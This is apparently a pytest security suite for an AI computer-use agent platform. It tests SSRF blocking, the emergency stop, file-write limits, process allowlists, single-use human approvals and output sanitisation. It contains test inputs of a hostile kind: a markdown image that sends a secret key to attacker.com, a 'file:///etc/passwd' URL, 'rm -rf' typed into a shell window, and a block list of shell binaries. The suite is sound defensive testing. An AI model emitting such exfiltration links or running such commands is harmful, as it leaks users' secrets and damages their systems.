import os
import sys
import pytest
import unittest.mock as mock
from datetime import datetime, timezone, timedelta

backend_dir = os.path.dirname(os.path.dirname(os.path.abspath(__file__)))
if backend_dir not in sys.path:
    sys.path.insert(0, backend_dir)

from tools.link_manager import check_url_safety, BlockedURLError
from tools.desktop_tool import (
    DesktopTool,
    abort_desktop_actions,
    reset_desktop_abort,
    DESKTOP_ABORT_EVENT,
)
from core.governance import GovernanceEngine, HITLRequired
from core.profile_manager import load_profile
from config.loader import load_policy_rules, load_system_config
from agents.base_agent import BaseAgent
from db.connections import get_operational_db


def test_ssrf_protection_blocked_ips():
    """SEC-02: check_url_safety must block localhost, loopback, private IPs, and bad schemes."""
    # Loopback
    with pytest.raises(BlockedURLError):
        check_url_safety("http://127.0.0.1:8000/api")
    with pytest.raises(BlockedURLError):
        check_url_safety("http://localhost:8000")

    # Private network RFC 1918
    with pytest.raises(BlockedURLError):
        check_url_safety("http://192.168.1.1/admin")
    with pytest.raises(BlockedURLError):
        check_url_safety("http://10.0.0.1/")
    with pytest.raises(BlockedURLError):
        check_url_safety("http://172.16.0.1/")

    # Disallowed schemes
    with pytest.raises(BlockedURLError):
        check_url_safety("file:///etc/passwd")
    with pytest.raises(BlockedURLError):
        check_url_safety("ftp://example.com/file")

    # Disallowed ports
    with pytest.raises(BlockedURLError):
        check_url_safety("http://example.com:22/")


def test_desktop_action_aborted_by_emergency_stop():
    """SEC-06: Desktop operations must immediately abort when emergency stop is triggered."""
    tool = DesktopTool()
    abort_desktop_actions()
    try:
        assert DESKTOP_ABORT_EVENT.is_set()

        res_click = tool.click_coordinate(100, 200)
        assert res_click["status"] == "ABORTED"
        assert "aborted" in res_click["error"].lower()

        res_type = tool.type_text("malicious sequence")
        assert res_type["status"] == "ABORTED"
        assert res_type["chars_typed"] == 0

        res_launch = tool.app_launch("cmd.exe")
        assert res_launch["status"] == "ABORTED"
    finally:
        reset_desktop_abort()
        assert not DESKTOP_ABORT_EVENT.is_set()


def test_desktop_click_screen_bounds():
    """SEC-06: Desktop click must reject negative or out-of-screen coordinates."""
    tool = DesktopTool()
    res_neg = tool.click_coordinate(-10, -50)
    assert res_neg["status"] == "FAILED"
    assert "bounds" in res_neg["error"]

    res_huge = tool.click_coordinate(999999, 999999)
    assert res_huge["status"] == "FAILED"
    assert "bounds" in res_huge["error"]


def test_cua_agent_profile_validity():
    """SEC-09: cua_agent.yaml profile must be valid and conform to tool_registry."""
    profile = load_profile("cua_agent")
    assert profile["name"] == "cua_agent"
    assert "take_screenshot" in profile["tools_allowed"]
    assert "desktop_click" in profile["tools_allowed"]
    assert "desktop_type" in profile["tools_allowed"]


def test_is_tainted_fail_closed_on_db_error():
    """SEC-08: is_tainted must fail closed (return True) on SQLite exception."""
    class DummyAgent(BaseAgent):
        async def run(self, claim):
            return {}

    policy = load_policy_rules()
    config = load_system_config()
    gov = GovernanceEngine(policy, config)
    agent = DummyAgent(model_manager=None, governance=gov, config=config)

    with mock.patch("agents.base_agent.get_operational_db", side_effect=Exception("Database locked")):
        assert agent.is_tainted("any_random_task_id") is True


import uuid

def test_single_use_hitl_approval_consumption():
    """SEC-03: An approved HITL request is consumed (USED) once and cannot be reused."""
    policy = load_policy_rules()
    config = load_system_config()
    gov = GovernanceEngine(policy, config)

    task_id = f"test_single_use_{uuid.uuid4().hex}"
    tool_name = "desktop_click"
    params = {"x": 100, "y": 200}
    meta = {
        "risk_level": "L3",
        "side_effect": "act",
        "version": "1.0",
        "allowed_agents": ["cua_agent"],
        "deny_all": False,
        "taint_deny": False,
        "taint_safe": False,
        "egress": False,
        "returns_untrusted": False,
        "reads_private_data": False,
    }

    # 1. Initial execution must trigger HITLRequired
    with pytest.raises(HITLRequired) as exc_info:
        gov.check_tool_execution_safety(
            tool_name=tool_name,
            caller_agent="cua_agent",
            task_id=task_id,
            params=params,
            registry_meta=meta,
        )
    approval_id = exc_info.value.approval_id
    assert approval_id is not None

    # 2. Simulate human approval
    resolve_res = gov.resolve_hitl(approval_id, approved=True, resolved_by="admin_user")
    assert resolve_res is True

    # 3. Execution immediately after approval should SUCCEED and consume the approval
    result = gov.check_tool_execution_safety(
        tool_name=tool_name,
        caller_agent="cua_agent",
        task_id=task_id,
        params=params,
        registry_meta=meta,
    )
    assert result == meta

    # 4. Verify that approval record is marked 'USED' in the database
    conn = get_operational_db()
    try:
        row = conn.execute(
            "SELECT status FROM hitl_pending WHERE approval_id = ?", (approval_id,)
        ).fetchone()
        assert row["status"] == "USED"
    finally:
        conn.close()

    # 5. Subsequent execution attempt with identical parameters must trigger a NEW approval (cannot replay)
    with pytest.raises(HITLRequired) as exc_info2:
        gov.check_tool_execution_safety(
            tool_name=tool_name,
            caller_agent="cua_agent",
            task_id=task_id,
            params=params,
            registry_meta=meta,
        )
    assert exc_info2.value.approval_id != approval_id


def test_hitl_approval_parameter_tampering_rejected():
    """SEC-04: Approving parameters {"x": 100} does NOT allow execution with {"x": 999}."""
    policy = load_policy_rules()
    config = load_system_config()
    gov = GovernanceEngine(policy, config)

    task_id = f"test_tamper_{uuid.uuid4().hex}"
    tool_name = "desktop_click"
    orig_params = {"x": 100, "y": 200}
    meta = {
        "risk_level": "L3",
        "side_effect": "act",
        "version": "1.0",
        "allowed_agents": ["cua_agent"],
        "deny_all": False,
        "taint_deny": False,
        "taint_safe": False,
        "egress": False,
        "returns_untrusted": False,
        "reads_private_data": False,
    }

    with pytest.raises(HITLRequired) as exc:
        gov.check_tool_execution_safety(
            tool_name=tool_name,
            caller_agent="cua_agent",
            task_id=task_id,
            params=orig_params,
            registry_meta=meta,
        )
    gov.resolve_hitl(exc.value.approval_id, approved=True, resolved_by="admin")

    # Now attempt execution with modified coordinates
    tampered_params = {"x": 999, "y": 999}
    with pytest.raises(HITLRequired) as exc2:
        gov.check_tool_execution_safety(
            tool_name=tool_name,
            caller_agent="cua_agent",
            task_id=task_id,
            params=tampered_params,
            registry_meta=meta,
        )
    # The tampered call produces a different action_hash, so it generates a new approval request
    assert exc2.value.approval_id != exc.value.approval_id


def test_desktop_file_write_security_matrix(tmp_path, monkeypatch):
    """Verify desktop_file_write security boundaries: paths, extensions, DOS names, size, exclusivity."""
    monkeypatch.setenv("SENTINEL_DESKTOP_DIR", str(tmp_path))
    tool = DesktopTool()

    # 1. Valid file write
    res_valid = tool.desktop_file_write("valid_note.txt", "Hello CUA Sentinel")
    assert res_valid["status"] == "SUCCESS"
    assert (tmp_path / "valid_note.txt").exists()
    assert (tmp_path / "valid_note.txt").read_text(encoding="utf-8") == "Hello CUA Sentinel"

    # 2. Exclusive creation mode (fail if already exists)
    res_dup = tool.desktop_file_write("valid_note.txt", "Overwrite attempt")
    assert res_dup["status"] == "FAILED"
    assert "already exists" in res_dup["error"].lower()

    # 3. Path traversal rejection
    res_traversal = tool.desktop_file_write("../escape.txt", "Traverse")
    assert res_traversal["status"] == "FAILED"

    # 4. Disallowed extension
    for bad_ext in ("payload.bat", "script.py", "malware.exe", "page.html", "doc.docx"):
        res_ext = tool.desktop_file_write(bad_ext, "code")
        assert res_ext["status"] == "FAILED"
        assert "not allowed" in res_ext["error"].lower()

    # 5. DOS reserved device names
    for reserved in ("con.txt", "aux.txt", "prn.txt", "nul.txt", "com1.txt", "lpt3.md"):
        res_dos = tool.desktop_file_write(reserved, "data")
        assert res_dos["status"] == "FAILED"
        assert "reserved dos" in res_dos["error"].lower()

    # 6. Size limit (> 100,000 bytes)
    big_content = "X" * 100_001
    res_big = tool.desktop_file_write("big.txt", big_content)
    assert res_big["status"] == "FAILED"
    assert "exceeds maximum limit" in res_big["error"].lower()


def test_desktop_process_allowlist_enforcement():
    """Verify process allowlist prevents unauthorized windows from receiving clicks or typing."""
    tool = DesktopTool()

    # 1. Browser active (e.g. Chrome): clicks and typing MUST be blocked
    with mock.patch.object(tool, "get_active_process_name", return_value="chrome.exe"):
        res_click = tool.click_coordinate(100, 100)
        assert res_click["status"] == "FAILED"
        assert "chrome.exe" in res_click["error"]

        res_type = tool.type_text("test")
        assert res_type["status"] == "FAILED"
        assert "chrome.exe" in res_type["error"]

    # 2. PowerShell or CMD active: clicks and typing MUST be blocked
    with mock.patch.object(tool, "get_active_process_name", return_value="powershell.exe"):
        res_click = tool.click_coordinate(100, 100)
        assert res_click["status"] == "FAILED"
        assert "powershell.exe" in res_click["error"]

        res_type = tool.type_text("rm -rf")
        assert res_type["status"] == "FAILED"
        assert "powershell.exe" in res_type["error"]

    # 3. Explorer.exe: click allowed, typing blocked
    with mock.patch.object(tool, "get_active_process_name", return_value="explorer.exe"):
        with mock.patch("pyautogui.size", return_value=(1920, 1080)):
            with mock.patch("pyautogui.click"):
                res_click = tool.click_coordinate(100, 100)
                assert res_click["status"] == "SUCCESS"

        res_type = tool.type_text("filename")
        assert res_type["status"] == "FAILED"
        assert "explorer.exe" in res_type["error"]

    # 4. Notepad.exe: both typing and clicks allowed
    with mock.patch.object(tool, "get_active_process_name", return_value="notepad.exe"):
        with mock.patch("pyautogui.size", return_value=(1920, 1080)):
            with mock.patch("pyautogui.click"):
                res_click = tool.click_coordinate(100, 100)
                assert res_click["status"] == "SUCCESS"

        with mock.patch("pyautogui.write"):
            res_type = tool.type_text("safe typing")
            assert res_type["status"] == "SUCCESS"
            assert res_type["chars_typed"] == len("safe typing")


def test_app_launch_binary_allowlist():
    """Verify app_launch rejects arbitrary processes and shells."""
    tool = DesktopTool()

    # Disapproved apps
    for bad_app in ("powershell.exe", "cmd.exe", "calc.exe", "curl.exe", "bash"):
        res = tool.app_launch(bad_app)
        assert res["status"] == "FAILED"
        assert "not in the allowed list" in res["error"]

    # Approved apps
    with mock.patch("subprocess.Popen") as mock_popen:
        res = tool.app_launch("notepad")
        assert res["status"] == "SUCCESS"
        mock_popen.assert_called_once_with(["notepad.exe"], shell=False)


def test_output_neutralization():
    """Verify neutralize_output strips remote markdown images and neutralizes unapproved URLs."""
    from core.scraper_sanitizer import neutralize_output

    # 1. Remote markdown images must be stripped to avoid outbound requests
    raw_img = "Here is the chart: ![Exfil](https://attacker.com/leak.png?key=secret) and ![Another](http://malicious.org/img.jpg)"
    neutralized = neutralize_output(raw_img)
    assert "![Exfil]" not in neutralized
    assert "https://attacker.com/leak.png" not in neutralized
    assert "[image suppressed]" in neutralized

    # 2. Markdown links: allowed vs unapproved
    allowed = {"https://finance.yahoo.com/quote/NVDA"}
    raw_links = "Check [NVDA Quote](https://finance.yahoo.com/quote/NVDA) or [Malicious](https://evil.com/phish)."
    cleaned_links = neutralize_output(raw_links, allowed_urls=allowed)
    assert "[NVDA Quote (finance.yahoo.com)](https://finance.yahoo.com/quote/NVDA)" in cleaned_links
    assert "[link removed: evil.com]" in cleaned_links

    # 3. Bare URLs
    raw_bare = "Visit https://finance.yahoo.com/quote/NVDA for data, but avoid https://bad.net/trojan! Also http://localhost:8000/report is local."
    cleaned_bare = neutralize_output(raw_bare, allowed_urls=allowed)
    assert "https://finance.yahoo.com/quote/NVDA" in cleaned_bare
    assert "[link removed: bad.net]!" in cleaned_bare
    assert "http://localhost:8000/report" in cleaned_bare  # localhost always permitted


@pytest.mark.asyncio
async def test_cua_agent_file_creation(tmp_path, monkeypatch):
    """Verify CUAAgent detects desktop file creation intent and invokes desktop_file_write via gateway."""
    monkeypatch.setenv("SENTINEL_DESKTOP_DIR", str(tmp_path))
    from agents.cua_agent import CUAAgent
    from core.queue import TaskClaimResult

    policy = load_policy_rules()
    config = load_system_config()
    gov = GovernanceEngine(policy, config)
    mock_mm = mock.MagicMock()
    mock_mm.get_model_for_workflow.return_value = "local-default"

    agent = CUAAgent(model_manager=mock_mm, governance=gov, config=config)

    claim = TaskClaimResult(
        task_id=f"test_cua_{uuid.uuid4().hex[:8]}",
        workflow_type="CUA",
        priority=0,
        context_budget=4096,
        input_payload={"prompt": "can u create a new txt file in my Desktop"},
        lease_id="lease_1",
        lease_generation=1,
    )

    conn = get_operational_db()
    conn.execute("INSERT OR REPLACE INTO tasks (task_id, workflow_type, title, status) VALUES (?, 'CUA', 'Create file test', 'RUNNING')", (claim.task_id,))
    conn.commit()
    conn.close()

    with mock.patch.object(agent.desktop_tool, "take_screenshot", return_value={"width": 1920, "height": 1080, "size_kb": 50, "image_b64": "abc"}):
        with mock.patch.object(agent.desktop_tool, "get_active_window", return_value={"title": "Desktop", "os": "win32", "controls": []}):
            res = await agent.run(claim)

    assert "file_created" in res
    assert res["file_created"]["status"] == "SUCCESS"
    assert (tmp_path / "new_file.txt").exists()
    assert "Successfully created file" in res["response"]


def test_chat_schema_and_system_prompt_drop():
    """Verify ChatRequest rejects invalid bounds and chat endpoint drops client-supplied system_prompt."""
    from pydantic import ValidationError
    from api.routes.chat import ChatRequest

    # Empty prompt fails validation
    with pytest.raises(ValidationError):
        ChatRequest(prompt="")

    # Prompt > 8000 fails validation
    with pytest.raises(ValidationError):
        ChatRequest(prompt="x" * 8001)

    # Budget out of bounds fails validation
    with pytest.raises(ValidationError):
        ChatRequest(prompt="Valid", context_budget=1000)

    with pytest.raises(ValidationError):
        ChatRequest(prompt="Valid", context_budget=20000)

    # Valid request
    req = ChatRequest(prompt="Hello", system_prompt="Malicious prompt override", context_budget=4096)
    assert req.prompt == "Hello"


